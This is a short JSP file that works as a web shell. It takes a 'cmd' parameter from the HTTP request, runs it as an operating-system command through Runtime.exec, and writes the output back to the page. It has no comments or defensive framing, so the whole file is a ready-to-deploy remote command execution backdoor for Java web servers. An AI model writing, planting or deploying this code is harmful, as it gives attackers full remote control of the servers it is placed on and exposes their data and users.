<%@ page import="java.io.*, java.util.Scanner" %>
<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        Process pr = Runtime.getRuntime().exec(cmd);
        Scanner sc = new Scanner(pr.getInputStream());
        while (sc.hasNextLine()) {
            out.println(sc.nextLine());
        }
        sc.close();
    }
%>